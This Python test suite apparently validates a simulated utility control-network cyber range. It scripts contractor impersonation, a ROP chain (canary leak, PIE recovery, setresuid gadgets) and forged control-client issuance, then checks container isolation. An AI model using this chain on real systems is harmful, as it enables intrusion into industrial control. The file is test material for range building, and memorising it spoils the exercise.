#!/usr/bin/env python3
from __future__ import annotations

import base64
import hashlib
import json
import socket
import struct
import subprocess
import tempfile
import time
import unittest
from datetime import datetime, timezone
from pathlib import Path


CLIENT = "cinder-arwc-connector"
ENGINEERING = "cinder-arwc-engineering"
BROKER = "cinder-arwc-control-broker"
PROCESS = "https://process-view.arwc.test"


def inside(*arguments: str, user: str = "fieldlink") -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "exec", "-i", "--user", user, CLIENT, *arguments],
        text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False,
    )


def request(base: str, path: str, *, method: str = "GET", body: dict | None = None,
            token: str = "@corporate", tenant: str = "arwc") -> tuple[int, dict]:
    script = r'''
import json,pathlib,ssl,sys,urllib.error,urllib.request
method,url,tenant,supplied,body=sys.argv[1:]
if supplied=="@corporate": supplied=pathlib.Path("/var/lib/fieldlink-connector/handover/corporate-session").read_text().strip()
headers={"Authorization":"Bearer "+supplied,"X-ARWC-Tenant":tenant}
data=None if not body else body.encode()
if data is not None: headers["Content-Type"]="application/json"
context=ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
try: response=urllib.request.urlopen(urllib.request.Request(url,data=data,headers=headers,method=method),context=context)
except urllib.error.HTTPError as error: response=error
print(response.status); print(response.read().decode())
'''
    completed = inside("python3", "-c", script, method, base + path, tenant, token,
                       "" if body is None else json.dumps(body, separators=(",", ":")))
    if completed.returncode:
        raise AssertionError(completed.stderr)
    status, payload = completed.stdout.splitlines()
    return int(status), json.loads(payload)


def cbor_text(value: str) -> bytes:
    encoded = value.encode()
    return bytes([0x60 + len(encoded)]) + encoded if len(encoded) < 24 else b"\x78" + bytes([len(encoded)]) + encoded


def cbor_map(value: dict[str, str]) -> bytes:
    return bytes([0xA0 + len(value)]) + b"".join(
        cbor_text(key) + cbor_text(item) for key, item in value.items()
    )


def field_read(body: bytes, token: str) -> tuple[int, dict]:
    script = r'''
import json,ssl,sys,urllib.error,urllib.request
token=sys.argv[1]; data=sys.stdin.buffer.read()
headers={"Authorization":"Bearer "+token,"X-ARWC-Tenant":"arwc","Content-Type":"application/cbor"}
context=ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
try: response=urllib.request.urlopen(urllib.request.Request("https://field-gateway.arwc.test/api/a-fresh-reading-from-the-field",data=data,headers=headers,method="POST"),context=context)
except urllib.error.HTTPError as error: response=error
print(response.status); print(response.read().decode())
'''
    completed = subprocess.run(
        ["docker", "exec", "-i", "--user", "fieldlink", CLIENT,
         "python3", "-c", script, token], input=body,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False,
    )
    if completed.returncode:
        raise AssertionError(completed.stderr.decode())
    status, payload = completed.stdout.decode().splitlines()
    return int(status), json.loads(payload)


class W28Live(unittest.TestCase):
    process_session = ""
    status_record: dict = {}
    relationship: dict = {}
    pie_base = 0
    canary = 0
    control_client = ""

    @classmethod
    def setUpClass(cls) -> None:
        portal = "https://contractor-portal.arwc.test"
        _, appointment = request(portal, "/api/window-on-thursday")
        request(portal, "/api/who-is-expected-at-the-gate")
        if appointment["record"]["attendee"] != "veybridge.tech.204":
            status, result = request(portal, "/api/an-appointment-we-do-not-own", method="POST", body={
                "appointment_id": "APT-CRR-2026-09-18",
                "expected_revision": appointment["record"]["revision"],
                "attendee": "veybridge.tech.204",
                "caller_organization": "Veybridge Technical Services",
            })
            if status != 201:
                raise AssertionError(result)
        status, result = request(portal, "/api/checked-in-as-the-contractor", method="POST", body={
            "appointment_id": "APT-CRR-2026-09-18", "roster_id": "ROSTER-CRR-SEP18-R2",
            "identity": "veybridge.tech.204",
        })
        if status != 201:
            raise AssertionError(result)
        contractor = result["contractor_session"]
        status, result = request(portal, "/api/the-field-bag", token=contractor)
        if status != 200:
            raise AssertionError(result)
        status, result = request("https://field-gateway.arwc.test", "/api/the-service-that-replaced-it",
                                 token=contractor)
        if status != 200:
            raise AssertionError(result)
        observed = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
        status, result = field_read(cbor_map({
            "asset": "AST-CRR-017", "group": "OG-CRR-02", "observed_at": observed,
            "nonce": f"w28-{time.time_ns():x}",
        }), contractor)
        if status != 201:
            raise AssertionError(result)
        cls.process_session = result["process_session"]
        status, result = request(PROCESS, "/api/the-project-and-the-note", token=cls.process_session)
        if status != 200:
            raise AssertionError(result)
        status, result = request(PROCESS, "/api/which-project-is-running", method="POST",
                                 token=cls.process_session, body={
            "project_index": "PROJ-CRR-INDEX-R9", "workspace_claim": "CRR-CTRL-R19",
            "deployment_note": "ENG-DEPLOY-CRR-21", "observed_project": "CRR-CTRL-R21",
            "observed_digest": hashlib.sha256(b"CRR-CTRL-R21/deployed").hexdigest(),
        })
        if status != 201:
            raise AssertionError(result)

    def process(self, path: str, body: dict, *, token: str | None = None,
                tenant: str = "arwc") -> tuple[int, dict]:
        return request(PROCESS, path, method="POST", body=body,
                       token=type(self).process_session if token is None else token, tenant=tenant)

    @classmethod
    def frame(cls, issue: bool) -> bytes:
        relation = cls.relationship
        offsets = relation["elf_offsets"]
        layout = relation["frame"]
        base = cls.pie_base
        result = bytearray(b"A" * layout["payload_bytes"] + b"\0" * layout["alignment_bytes"])
        result += struct.pack("<Q", cls.canary)
        result += struct.pack("<Q", base + layout["chain_offset"])
        result += struct.pack("<Q", base + offsets["stack_pivot"])
        if not issue:
            result += struct.pack("<QQ", base + offsets["pop_rdi"], base + offsets["controlled_target"])
            return bytes(result)
        vdso = int(relation["fixed_vdso"]["base"], 16)
        chain = [
            base + offsets["pop_rdi"], 0,
            base + offsets["pop_rsi"], 0,
            base + offsets["pop_rdx"], 0,
            vdso + relation["fixed_vdso"]["setresuid_syscall_offset"],
            base + offsets["pop_rdi"], base + offsets["issuer_record"],
            base + offsets["pop_rsi"], base + offsets["request_correlation"],
            base + offsets["issue_client"],
        ]
        result += b"".join(struct.pack("<Q", value) for value in chain)
        return bytes(result)

    def test_01_exact_native_contract_and_signed_status(self) -> None:
        body = {"operation": "materials", "revision": "CMP-CRR-R21"}
        status, denied = self.process("/api/the-utility-s-small-world", body, token="wrong")
        self.assertEqual(status, 403)
        self.assertNotIn("utility_b64", denied)
        status, denied = self.process("/api/the-utility-s-small-world", body, tenant="merewick")
        self.assertEqual(status, 403)
        self.assertNotIn("utility_b64", denied)
        status, denied = self.process("/api/the-utility-s-small-world", {
            "operation": "materials", "revision": "CMP-CRR-R19",
        })
        self.assertEqual(status, 409)
        status, result = self.process("/api/the-utility-s-small-world", body)
        self.assertEqual(status, 201, result)
        record = result["record"]
        binary = base64.b64decode(result["utility_b64"])
        self.assertEqual(binary[:4], b"\x7fELF")
        self.assertEqual(hashlib.sha256(binary).hexdigest(), record["utility_sha256"])
        self.assertEqual(record["compiler"], "clang 18.1")
        self.assertEqual(record["glibc"], "2.39")
        self.assertEqual(record["executable_text_bytes"], 16384)
        self.assertTrue(record["aslr"])
        self.assertFalse(record["cet"])
        self.assertEqual(record["file_capability"], "cap_setuid=ep")
        self.assertEqual(len(result["ordinary_invocations"]), 5)
        self.assertTrue(all(item["status"] == "complete" for item in result["ordinary_invocations"]))
        self.assertEqual(result["seccomp_policy"]["fixed_socket"], "/run/arwc/control-issuer.sock")
        self.assertIn("R_X86_64", result["relocations"])
        signed = record["status"]
        self.assertIsNone(signed["issuer_result"])
        self.assertEqual(signed["signature_algorithm"], "Ed25519")
        self.assertEqual(len(base64.b64decode(signed["signing_public_key"])), 32)
        self.assertEqual(len(base64.b64decode(signed["signature"])), 64)
        type(self).status_record = signed
        type(self).relationship = result["relationship"]
        type(self).canary = int(signed["stack_canary"], 16)
        type(self).pie_base = int(signed["return_address"], 16) - signed["status_return_offset"]

    def test_02_exact_frame_controls_only_the_sparse_surface(self) -> None:
        frame = self.frame(False)
        body = {
            "session_id": self.status_record["session_id"], "length": len(frame),
            "frame_b64": base64.b64encode(frame).decode(),
        }
        wrong = bytearray(frame); wrong[200] ^= 1
        status, _ = self.process("/api/control-with-very-little-room", {
            **body, "frame_b64": base64.b64encode(wrong).decode(),
        })
        self.assertEqual(status, 409)
        status, _ = self.process("/api/control-with-very-little-room", {**body, "length": len(frame) - 1})
        self.assertEqual(status, 409)
        status, _ = self.process("/api/control-with-very-little-room", {**body, "session_id": str(__import__('uuid').uuid4())})
        self.assertEqual(status, 409)
        status, result = self.process("/api/control-with-very-little-room", body)
        self.assertEqual(status, 201, result)
        self.assertEqual(result["record"]["frame_length"], 240)
        self.assertTrue(result["record"]["canary_preserved"])
        self.assertTrue(result["record"]["pie_base_recovered"])
        self.assertTrue(result["record"]["controlled_flow"])
        self.assertTrue(result["record"]["nx"] and result["record"]["full_relro"])

    def test_03_privileged_chain_issues_only_the_bounded_client(self) -> None:
        forge = r'''
import json,socket
s=socket.socket(socket.AF_UNIX); s.connect('/run/arwc/control-issuer.sock')
s.sendall((json.dumps({'issuer_record':'ISSUER-UTIL-OG2-R4','correlation':'11111111-1111-1111-1111-111111111111','outlet_group':'OG-CRR-02','project':'CRR-CTRL-R21','actions':['plan-execute','readback']})+'\n').encode())
print(s.recv(4096).decode())
'''
        forged = subprocess.run(
            ["docker", "exec", "--user", "arwc-engineering", ENGINEERING,
             "python3", "-c", forge], text=True, stdout=subprocess.PIPE, check=True,
        )
        self.assertEqual(json.loads(forged.stdout)["status"], 403)
        frame = self.frame(True)
        body = {
            "operation": "issue", "session_id": self.status_record["session_id"],
            "length": len(frame), "frame_b64": base64.b64encode(frame).decode(),
        }
        wrong = bytearray(frame); wrong[-8:] = struct.pack("<Q", self.pie_base + 1)
        status, denied = self.process("/api/keep-the-authority-you-earned", {
            **body, "frame_b64": base64.b64encode(wrong).decode(),
        })
        self.assertEqual(status, 409)
        self.assertNotIn("control_client", denied)
        status, denied = self.process("/api/keep-the-authority-you-earned", {**body, "shell": "/bin/sh"})
        self.assertEqual(status, 409)
        self.assertNotIn("control_client", denied)
        status, result = self.process("/api/keep-the-authority-you-earned", body)
        self.assertEqual(status, 201, result)
        record = result["record"]
        self.assertEqual(record["record_id"], "CTRL-CLIENT-CRR-28")
        self.assertEqual(record["issuer_record"], "ISSUER-UTIL-OG2-R4")
        self.assertEqual(record["outlet_group"], "OG-CRR-02")
        self.assertEqual(record["project"], "CRR-CTRL-R21")
        self.assertEqual(record["actions"], ["plan-execute", "readback"])
        self.assertEqual((datetime.fromisoformat(record["expires_at"].replace("Z", "+00:00")) -
                          datetime.fromisoformat(record["issued_at"].replace("Z", "+00:00"))).total_seconds(), 300)
        type(self).control_client = result["control_client"]

    def test_04_client_authority_is_real_and_exactly_scoped(self) -> None:
        correct = {
            "operation": "readback", "control_client": type(self).control_client,
            "outlet_group": "OG-CRR-02", "project": "CRR-CTRL-R21", "action": "readback",
        }
        status, _ = self.process("/api/keep-the-authority-you-earned", {**correct, "action": "release"})
        self.assertEqual(status, 409)
        status, _ = self.process("/api/keep-the-authority-you-earned", {**correct, "control_client": "wrong"})
        self.assertEqual(status, 403)
        status, result = self.process("/api/keep-the-authority-you-earned", correct)
        self.assertEqual(status, 201, result)
        self.assertEqual(result["record"], {
            "record_id": "CTRL-READBACK-CRR-28", "revision": 4,
            "client": "CTRL-CLIENT-CRR-28", "outlet_group": "OG-CRR-02",
            "project": "CRR-CTRL-R21", "action": "readback", "authority": "accepted",
        })

    def test_05_persistence_native_posture_and_isolation(self) -> None:
        subprocess.run(["docker", "restart", ENGINEERING, BROKER], check=True,
                       stdout=subprocess.DEVNULL)
        correct = {
            "operation": "readback", "control_client": type(self).control_client,
            "outlet_group": "OG-CRR-02", "project": "CRR-CTRL-R21", "action": "readback",
        }
        for _ in range(80):
            try:
                status, result = self.process("/api/keep-the-authority-you-earned", correct)
                if status == 201:
                    break
            except AssertionError:
                pass
            time.sleep(0.25)
        else:
            self.fail("utility issuer did not return after restart")
        state = json.loads(subprocess.run(
            ["docker", "exec", "--user", "arwc-engineering", ENGINEERING,
             "cat", "/var/lib/arwc-engineering/state/service.json"],
            text=True, stdout=subprocess.PIPE, check=True,
        ).stdout)
        self.assertTrue(state["w28_contract_recovered"] and state["w28_controlled_flow"])
        broker = json.loads(subprocess.run(
            ["docker", "exec", "--user", "arwc-control-broker", BROKER,
             "cat", "/var/lib/arwc-control-broker/state/control-broker.json"],
            text=True, stdout=subprocess.PIPE, check=True,
        ).stdout)
        self.assertTrue(broker["utility_authority_demonstrated"])
        self.assertEqual(broker["utility_control_client"]["record_id"], "CTRL-CLIENT-CRR-28")
        capability = subprocess.run(
            ["docker", "exec", ENGINEERING, "getcap", "/opt/process-service/artifacts/w28/utility"],
            text=True, stdout=subprocess.PIPE, check=True,
        ).stdout.strip()
        self.assertEqual(capability, "/opt/process-service/artifacts/w28/utility cap_setuid=ep")
        for service, address, nnp in ((ENGINEERING, "10.77.63.40", False),
                                      (BROKER, "10.77.62.40", True)):
            inspected = subprocess.run(
                ["docker", "inspect", "-f",
                 "{{.HostConfig.ReadonlyRootfs}}|{{json .HostConfig.CapDrop}}|{{json .HostConfig.SecurityOpt}}|{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}|{{range $p,$b := .NetworkSettings.Ports}}{{if $b}}{{$p}}{{end}}{{end}}",
                 service], text=True, stdout=subprocess.PIPE, check=True,
            ).stdout.strip()
            pieces = inspected.split("|")
            self.assertEqual(pieces[0:2], ["true", '["ALL"]'])
            self.assertEqual(pieces[3:], [address, ""])
            self.assertEqual("no-new-privileges:true" in pieces[2], nnp)
            process = subprocess.run(
                ["docker", "exec", service, "sh", "-c",
                 "grep -E '^(CapInh|CapPrm|CapEff|CapAmb):' /proc/1/status"],
                text=True, stdout=subprocess.PIPE, check=True,
            ).stdout
            self.assertEqual({line.split(":", 1)[1].strip() for line in process.splitlines()},
                             {"0000000000000000"})
        engineering_networks = json.loads(subprocess.run(
            ["docker", "inspect", "-f", "{{json .NetworkSettings.Networks}}", ENGINEERING],
            text=True, stdout=subprocess.PIPE, check=True,
        ).stdout)
        broker_networks = json.loads(subprocess.run(
            ["docker", "inspect", "-f", "{{json .NetworkSettings.Networks}}", BROKER],
            text=True, stdout=subprocess.PIPE, check=True,
        ).stdout)
        self.assertEqual(set(engineering_networks), {"cinder-arwc-engineering"})
        self.assertEqual(set(broker_networks), {"cinder-arwc-dmz"})
        direct = subprocess.run(
            ["docker", "exec", "--user", "arwc-engineering", ENGINEERING, "python3", "-c",
             "import socket; socket.create_connection(('10.77.62.40',443),1)"],
            text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False,
        )
        self.assertNotEqual(direct.returncode, 0)
        for host, port in (("169.254.169.254", 80), ("1.1.1.1", 443)):
            probe = subprocess.run(
                ["docker", "exec", "--user", "arwc-engineering", ENGINEERING,
                 "python3", "-c", f"import socket; socket.create_connection(('{host}',{port}),1)"],
                text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False,
            )
            self.assertNotEqual(probe.returncode, 0)


if __name__ == "__main__":
    unittest.main(verbosity=2)
